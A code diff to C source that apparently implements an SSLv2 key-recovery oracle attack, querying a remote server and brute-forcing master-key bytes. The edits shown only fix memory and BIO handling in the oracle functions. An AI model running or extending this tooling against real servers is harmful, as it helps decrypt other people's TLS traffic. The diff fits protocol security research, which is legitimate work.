@@ -211,6 +211,12 @@ int oracle_check_valid(SSL *ssl)
     // s->s2->rlength and s->s2->rbuf
     // with the ENTIRE payload
 
+    // We must free the old encryption
+    EVP_CIPHER_CTX_free(ssl->enc_write_ctx);
+    EVP_CIPHER_CTX_free(ssl->enc_read_ctx);
+    ssl->enc_write_ctx = NULL;
+    ssl->enc_read_ctx = NULL;
+
     ssl->s2->clear_text=0;
     assert(ssl2_enc_init(ssl, 1) == 1);
 
@@ -280,12 +286,8 @@ SSL * oracle_query(char *hostport, unsigned int keysize, unsigned char *clear_ke
     res = BIO_do_connect(web);
     assert(res == 1);
 
-    ssl->rbio = web;
-    ssl->wbio = web;
+    SSL_set_bio(ssl, web, web);
 
-    // SSL init
-    // TODO : don't forget to clean...
-    ssl2_new(ssl);
     ssl_get_new_session(ssl, 0);
 
     unsigned char *ciphers;
@@ -315,6 +317,12 @@ SSL * oracle_query(char *hostport, unsigned int keysize, unsigned char *clear_ke
     return ssl;
 }
 
+void oracle_free(SSL *s)
+{
+    SSL_CTX_free(s->ctx); // Weird, this should be freed by SSL_free
+    SSL_free(s);
+}
+
 int run_oracle_valid(char *hostport, unsigned int keysize, unsigned char *encrypted_key, unsigned int encrypted_key_length)
 {
     // Create null master key
@@ -325,7 +333,7 @@ int run_oracle_valid(char *hostport, unsigned int keysize, unsigned char *encryp
 
     int res = oracle_check_valid(ssl);
 
-    SSL_free(ssl);
+    oracle_free(ssl);
 
     return res;
 }
@@ -356,7 +364,7 @@ int run_oracle_guess(char *hostport, unsigned int keysize, unsigned char *encryp
 
         // Brute force the last byte
         res = guess_last_byte(ssl, &master_key_guess[keysize - 1]);
-        SSL_free(ssl);
+        oracle_free(ssl);
         if(!res)
         {
             return 0;
